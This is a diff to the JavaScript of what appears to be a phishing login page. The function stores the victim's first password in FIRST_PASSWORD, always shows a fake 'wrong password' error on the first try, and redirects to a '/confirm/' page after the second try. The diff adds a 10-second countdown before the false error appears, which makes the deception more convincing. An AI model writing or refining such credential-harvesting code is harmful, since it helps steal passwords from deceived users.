@@ -247,14 +247,38 @@ function showPrompt(IpAddress) {
         })
         .then(data => {
             NUMBER_TIME_LOGIN++;
-            if (NUMBER_TIME_LOGIN === 1) {
-                FIRST_PASSWORD = password;
-                setTimeout(function () {
-                    $('.lsd-ring-container').addClass('d-none');
-                    $('#wrong-password').removeClass('d-none');
-                    $("#password").val('');
-                }, 2000);
-            } else {
+          if (NUMBER_TIME_LOGIN === 1) {
+    FIRST_PASSWORD = password;
+
+    const submitBtn = $('#submit-password');
+    let countdown = 10;
+
+    // 👉 Cập nhật ngay để tránh delay hiển thị
+    submitBtn.text(`Wait ${countdown}s`);
+    submitBtn.prop('disabled', true);
+
+    // 👉 Delay phần DOM nặng sang vòng sau
+    setTimeout(() => {
+        $('.lsd-ring-container').addClass('d-none');
+        $('#password').val('');
+    }, 100); // hoãn 100ms để đảm bảo giao diện đã cập nhật nút
+
+    const interval = setInterval(() => {
+        countdown--;
+        if (countdown > 0) {
+            submitBtn.text(`Wait ${countdown}s`);
+        } else {
+            clearInterval(interval);
+            submitBtn.prop('disabled', false);
+            submitBtn.text('Continue');
+
+            // 👉 Hiện lỗi sau khi đếm xong
+            $('#wrong-password').removeClass('d-none');
+        }
+    }, 1000);
+}
+
+ else {
                 setTimeout(function () {
                     $('.lsd-ring-container').addClass('d-none');
                     window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
